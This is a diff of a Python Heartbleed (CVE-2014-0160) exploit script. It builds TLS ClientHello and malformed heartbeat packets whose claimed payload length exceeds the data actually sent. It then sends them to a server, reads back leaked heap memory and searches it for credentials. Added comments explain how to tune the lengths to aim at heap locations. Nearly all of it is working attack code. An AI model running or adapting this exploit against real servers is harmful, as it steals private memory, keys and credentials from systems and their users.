@@ -1,5 +1,6 @@
 import socket
 import hexdump
+import full_hb_payload
 
 def hex2bin(arr):
     return ''.join('{:02x}'.format(x) for x in arr)
@@ -32,36 +33,54 @@ client_hello = [
     0x01,                           # number of compression methods to follow
     0x00,                           # the compression method "no compression"
     0x00, 0x05,                     # length of extensions
-    # 0xff, 0x01, 0x00, 0x01, 0x00,   # Extension: renegotiation info
     0x00, 0x0f, 0x00, 0x01, 0x01   # Extension: HB
 ]
 
 tls_hello = bytes.fromhex(hex2bin(client_hello))
 
-# tls_heartbeat_s = [
-#     0x18,                               # Content Type (Heartbeat)
-#     0x03, tls_ver,                      # TLS version
-#     0x00, 0x03,                         # Actual Payload Length (+ overhead of 3 bytes)
-#     0x01,                               # Type (Request)
-#     0xff, 0xff,                         # Maliciously Crafted Payload length!!
-#     # 0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F  # Payload Data (potato, 6b)
-# ]
+
+
+# In a heartbeat request, if the claimed payload length is
+# larger than the actual length, this will trick a vulnerable
+# server into replying with more data than actually sent, as has
+# been described in [CVE-2014-0160] as _[heartbleed]_.
+
+# Play with "Actual payload length" to influence where on the heap you
+# want your payload to be allocated, and use "Crafted length" to
+# decide how much data you are trying to receive.
+#
+# `potato` string will be used as payload content, so if the server is
+# vulnerable, and the payload long enough, you will see them
+# back in the memory you receive.
+
+tls_heartbeat_s_potato = [
+    0x18,                                               # Content Type (Heartbeat)
+    0x03, tls_ver,                                      # TLS version
+    0x00, 0x0b,                                         # Padding Length (Payload + overhead of 3 bytes for header) <16k
+    0x01,                                               # Type (Request)
+    0xff, 0xff,                                         # Maliciously Crafted Payload length!!
+    0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F, 0x20, 0x20,     # Payload Data (potato, 6b)
+]
+
+tls_heartbeat_s_minimal = [
+    0x18,                               # Content Type (Heartbeat)
+    0x03, tls_ver,                      # TLS version
+    0x00, 0x03,                         # Padding Length (Payload + overhead of 3 bytes for header) <16k
+    0x01,                               # Type (Request)
+    0xff, 0xff,                         # Maliciously Crafted Payload length!!
+    # 0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F  # Payload Data (potato, 6b)
+]
 
 tls_heartbeat_s = [
     0x18,                               # Content Type (Heartbeat)
     0x03, tls_ver,                      # TLS version
-    0x00, 0x09,                         # Actual Payload Length (+ overhead of 3 bytes)
+    0x40, 0x00,                         # Padding Length (Payload + overhead of 3 bytes for header) <16k
     0x01,                               # Type (Request)
-    0xff, 0xff,                         # Maliciously Crafted Payload length!!
-    0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F  # Payload Data (potato, 6b)
-]
+    0x40, 0x00,                         # Maliciously Crafted Payload length!!
+    # 0x70, 0x6F, 0x74, 0x61, 0x74, 0x6F  # Payload Data (potato, 6b)
+] + full_hb_payload.correct_16k_payload
 
-tls_heartbeat = bytes.fromhex(hex2bin(tls_heartbeat_s))
-
-print(f"--------------------------------------")
-print(f"HeartBeat Request:")
-hexdump.hexdump(tls_heartbeat)
-print(f"--------------------------------------\n")
+tls_heartbeat = bytes.fromhex(hex2bin(tls_heartbeat_s_minimal))
 
 def findCredentials(r, key):
     startIndex = r.find(key.encode())
@@ -91,8 +110,18 @@ print('[Connecting to {} port {}]'.format(*server_address))
 s.connect(server_address)
 
 try:
+    print(f"--------------------------------------")
+    print(f"Establishing a TLS connection:")
+    hexdump.hexdump(tls_hello)
     s.sendall(tls_hello)     # Send Client Hello
     s.recv(8 * 1024)         # Receive Server Hello, Certificate, Server Hello Done
+    print(f"--------------------------------------\n")
+    
+    print(f"--------------------------------------")
+    print(f"Sending HeartBeat:")
+    hexdump.hexdump(tls_heartbeat)
+    print(f"--------------------------------------\n")
+
     s.sendall(tls_heartbeat) # Send badly formed Heartbeat Request
     r = s.recv(64*1024)      # Receive server memory!
 
